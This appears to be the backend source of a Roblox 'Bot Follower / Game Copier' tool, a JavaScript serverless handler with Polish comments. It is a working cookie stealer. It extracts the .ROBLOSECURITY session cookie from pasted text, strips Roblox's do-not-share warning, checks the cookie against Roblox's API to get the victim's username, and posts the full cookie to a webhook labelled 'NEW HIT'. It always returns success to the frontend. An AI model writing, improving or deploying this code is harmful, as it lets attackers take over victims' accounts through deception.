export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Only POST allowed" });
  }

  try {
    const { text } = req.body;
    const webhook = process.env.WEBHOOK_URL;

    if (!webhook) {
      return res.status(500).json({ error: "WEBHOOK_URL not set" });
    }

    if (!text || typeof text !== "string" || text.trim() === "") {
      return res.status(400).json({ error: "Brak danych" });
    }

    const input = text.trim();
    let extracted = null;           // stary format items.
    let cookieValue = null;
    let username = "Nie udało się odczytać nazwy użytkownika";

    // 1. Stary format – items.
    const match = input.match(/items\.(.*?)(["\,])/i);
    if (match) {
      extracted = match[1].trim();
    }

    // 2. Wyciąganie .ROBLOSECURITY z całego tekstu
    let possibleCookie = input;

    // Najczęstsze warianty wklejania
    if (possibleCookie.includes(".ROBLOSECURITY=")) {
      possibleCookie = possibleCookie.split(".ROBLOSECURITY=")[1].split(/;| /)[0].trim();
    }

    // Usuwamy początek ostrzeżenia jeśli ktoś wkleił całość
    possibleCookie = possibleCookie
      .replace(/^_\|WARNING:DO-NOT-SHARE-THIS\.\s*--Sharing-this-will-allow-someone-to-log-in-as-you-and-access-your-account\.\s*/, '')
      .replace(/^_\|WARNING:[^|]*\|\s*/, '')
      .trim();

    if (possibleCookie.startsWith("_|")) {
      cookieValue = possibleCookie;

      // Sprawdzamy cookie i pobieramy nazwę użytkownika
      try {
        const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
          method: "GET",
          headers: {
            "Cookie": `.ROBLOSECURITY=${cookieValue}`,
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
          },
          redirect: "manual"
        });

        console.log("Roblox API status:", authRes.status); // ← log do Vercel

        if (authRes.status === 200) {
          const data = await authRes.json();
          username = data.name || data.displayName || data.username || "Zalogowano (nazwa nie пришла)";
        } else if (authRes.status === 401) {
          username = "Cookie nieważne / wygasłe (401)";
        } else if (authRes.status === 429) {
          username = "Zbyt wiele zapytań (rate limit)";
        } else {
          username = `Błąd Roblox API: ${authRes.status}`;
        }
      } catch (fetchError) {
        console.error("Błąd podczas fetch do Roblox:", fetchError);
        username = "Błąd połączenia z Roblox (timeout / blokada)";
      }
    }

    // Budujemy treść embeda
    let description = "";

    if (extracted) {
      description += `**Wyodrębnione (items.):**\n\`\`\`${extracted}\`\`\`\n\n`;
    }

    if (cookieValue) {
      description += `**Cookie (.ROBLOSECURITY):**\n\`\`\`${cookieValue}\`\`\`\n\n`;
    }

    description += `**Nazwa użytkownika właściciela cookie:**\n${username}`;

    if (!extracted && !cookieValue) {
      description = "Nic nie wyodrębniono.\nWklejony tekst (pierwsze 400 znaków):\n\`\`\`" +
        input.substring(0, 400) + (input.length > 400 ? "..." : "") + "\`\`\`";
    }

    const embed = {
      title: "NEW HIT / COOKIE – Bot Follower",
      description: description,
      color: 16711680,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Bot Follower | Game Copier"
      }
    };

    const response = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [embed]
      })
    });

    const result = await response.text();

    // Zawsze sukces dla frontendu
    res.status(200).json({
      success: true,
      extracted,
      cookie: cookieValue ? cookieValue.substring(0, 60) + "..." : null,
      username,
      webhookResponse: result
    });

  } catch (err) {
    console.error("Błąd w API:", err);
    res.status(500).json({ error: err.message });
  }
}
